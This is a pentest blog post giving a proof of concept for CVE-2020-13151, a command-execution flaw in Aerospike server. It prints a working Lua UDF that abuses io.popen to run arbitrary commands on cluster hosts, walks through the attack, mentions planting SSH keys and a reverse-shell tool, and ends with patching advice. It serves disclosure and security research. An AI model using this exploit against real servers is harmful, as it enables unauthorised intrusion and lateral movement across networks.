<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
<title>CVE-2020-13151 POC: Aerospike Server Host Command Execution | -pentest notes-</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="CVE-2020-13151 POC: Aerospike Server Host Command Execution" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="An Aside" />
<meta property="og:description" content="An Aside" />
<link rel="canonical" href="https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html" />
<meta property="og:url" content="https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html" />
<meta property="og:site_name" content="-pentest notes-" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-08-01T00:00:00-06:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","url":"https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html","headline":"CVE-2020-13151 POC: Aerospike Server Host Command Execution","dateModified":"2020-08-01T00:00:00-06:00","datePublished":"2020-08-01T00:00:00-06:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://b4ny4n.github.io/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html"},"description":"An Aside","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://b4ny4n.github.io/feed.xml" title="-pentest notes-" /><meta name="google-site-verification" content="nlJMfC4WayD_vnFDQ8FYEK1U0EBzlyFHO-Zioe4MvBs" />
</head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">-pentest notes-</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">about</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">CVE-2020-13151 POC: Aerospike Server Host Command Execution</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2020-08-01T00:00:00-06:00" itemprop="datePublished">2020-08-01
      </time></p>
  </header>
 
  <div class="post-content e-content" itemprop="articleBody">
 	<p><strong>standard disclaimer</strong>: anything shown here is only to be used for education and research, or on networks/systems for which you've been give explicit permission to test -- hacking without permission is illegal.
	  <ul class="section-nav">
<li class="toc-entry toc-h1"><a href="#an-aside">An Aside</a></li>
<li class="toc-entry toc-h1"><a href="#motivation">Motivation</a></li>
<li class="toc-entry toc-h1"><a href="#prerequisites">Prerequisites</a></li>
<li class="toc-entry toc-h1"><a href="#exploiting">Exploiting</a></li>
<li class="toc-entry toc-h1"><a href="#try-it-out">Try it out</a></li>
<li class="toc-entry toc-h1"><a href="#if-youre-defending">If You’re Defending</a></li>
</ul><h1 id="an-aside">
<a class="anchor" href="#an-aside" aria-hidden="true"><span class="octicon octicon-link"></span></a>An Aside</h1>

<p>The Aerospike team was really great to work with on this CVE. They were very responsive and quickly developed a patch and worked it into production.</p>

<h1 id="motivation">
<a class="anchor" href="#motivation" aria-hidden="true"><span class="octicon octicon-link"></span></a>Motivation</h1>

<p>I recently disclosed CVE-2020-13151 to Aerospike after finding that I could execute commands against the underlying aerospike database hosts during an engagement. If you find an unpatched version of Aerospike server during testing, there may be a quick shell available. Depending on what else the hosts are used for this can be a good pivot point in the network.</p>

<h1 id="prerequisites">
<a class="anchor" href="#prerequisites" aria-hidden="true"><span class="octicon octicon-link"></span></a>Prerequisites</h1>

<ul>
  <li>An unpatched (or non-hardened) version of the Aerospike server.</li>
  <li>Patches came in two stages:
    <ul>
      <li>Versions 5.0.0.7, 4.9.0.10, 4.8.0.13, 4.7.0.17, 4.6.0.19 and 4.5.3.21 received the ability to disable lua UDFs</li>
      <li>Versions 5.1.0.3 and beyond blocked the process creation in the UDFs</li>
    </ul>
  </li>
</ul>

<p>Authentication is not offered on the community edition making the attack very simple on unpatched versions. I was unable to test this attack on the enterprise edition, so if you find one on an engagement, you’ll need to experiment a bit (and probably obtain some credentials).</p>

<h1 id="exploiting">
<a class="anchor" href="#exploiting" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exploiting</h1>

<p><strong>tl;dr</strong>
scripted exploit tool is here: <a href="https://github.com/b4ny4n/CVE-2020-13151">https://github.com/b4ny4n/CVE-2020-13151</a></p>

<p>Again, this was only tested on the server community edition as I didn’t have access to the enterprise version. A nicety from an attacker point-of-view is that the community edition does not allow for authentication, making this attack very easy.</p>

<p>To show how it works, I’ll walk through a manual way to run the attack, though I’ve created a some tooling around it here <a href="https://github.com/b4ny4n/CVE-2020-13151">here</a>.</p>

<p>This attack is possible due to inusfficient blacklisting of functions in lua UDFs. Aerospike seems to have (sensibly) blocked <code class="language-plaintext highlighter-rouge">os.execute</code> calls during UDF execution, however the same precautions do not appear to be in place for <code class="language-plaintext highlighter-rouge">io.popen</code>.</p>

<p>Consider the following UDF, which when registered will allow us to execute and display the results of a command whichever host in the cluster ends up executing the function.</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="nf">runCMD</span><span class="p">(</span><span class="n">rec</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
    <span class="kd">local</span> <span class="n">outtext</span> <span class="o">=</span> <span class="s2">""</span>
    <span class="kd">local</span> <span class="n">phandle</span> <span class="o">=</span> <span class="nb">io.popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="nb">io.input</span><span class="p">(</span><span class="n">phandle</span><span class="p">)</span>
    <span class="kd">local</span> <span class="n">foo</span> <span class="o">=</span> <span class="nb">io.lines</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">f</span> <span class="k">in</span> <span class="n">foo</span> <span class="k">do</span>
        <span class="n">outtext</span> <span class="o">=</span> <span class="n">outtext</span> <span class="o">..</span> <span class="n">f</span> <span class="o">..</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
    <span class="k">end</span>
    <span class="k">return</span> <span class="n">outtext</span>
<span class="k">end</span>
</code></pre></div></div>

<p>Once connected to the cluster (again, no auth in the community edition), we can register our udf:
<img src="/screens/aero-register-udf.png" alt=""></p>

<p>Create a single-record test dataset to operate on:
<img src="/screens/aero-create-table.png" alt=""></p>

<p>And then execute commands on whichever host ended up hosting our record:
<img src="/screens/aero-execute-cmd.png" alt=""></p>

<p>In a large enough cluster an attacker could create a much larger dataset and repeatedly execute the commands against different records which would have the effect of spraying the command around the cluster (which would be fun for dropping ssh keys, for example).</p>

<h1 id="try-it-out">
<a class="anchor" href="#try-it-out" aria-hidden="true"><span class="octicon octicon-link"></span></a>Try it out</h1>

<p>I’ve written a tool which injects records into the target cluster and then executes the desired commands.</p>

<p>It can be used to obtain a reverse shell:</p>

<p><img src="/screens/aero-revshell.png" alt=""></p>

<p>Or just to issue arbitrary commands:</p>

<p><img src="/screens/aero-cmdexec.png" alt=""></p>

<p>You can grab the tool <a href="https://github.com/b4ny4n/CVE-2020-13151">here</a> and experiment with it against a local docker setup:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c"># start up a single-node aerospike instance</span>
docker run <span class="nt">--rm</span> <span class="nt">-d</span> <span class="nt">--name</span> aerospike <span class="nt">-p</span> 3000:3000 <span class="nt">-p</span> 3001:3001 <span class="nt">-p</span> 3002:3002 <span class="nt">-p</span> 3003:3003 aerospike:4.9.0.5

<span class="c"># if you want to issue commands against the server interactively, </span>
<span class="c"># fire up a client to interact with the server (also dockerized)</span>
<span class="c"># changing the --host IP as necessary</span>
docker run <span class="nt">-v</span> <span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>:/share <span class="nt">-ti</span> <span class="nt">--name</span> aerospike-aql <span class="nt">--rm</span> aerospike/aerospike-tools aql <span class="nt">--host</span> 172.17.0.2 <span class="nt">--no-config-file</span>
</code></pre></div></div>

<h1 id="if-youre-defending">
<a class="anchor" href="#if-youre-defending" aria-hidden="true"><span class="octicon octicon-link"></span></a>If You’re Defending</h1>

<p>Patch and firewall off backend servers if you’re on the community edition (ideally, they should only respond to the web apps fronting them). If you’re on the enterprise version, ensure you have strong authentication and minimize permission and access.</p>

  </div><a class="u-url" href="/network-pentest/2020/08/01/cve-2020-13151-poc-aerospike.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">-pentest notes-</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">-pentest notes-</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/b4ny4n"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">b4ny4n</span></a></li><li><a href="https://www.twitter.com/b4ny4n"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">b4ny4n</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>some security-related notes from the field, hopefully of use to other attackers/defenders...</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
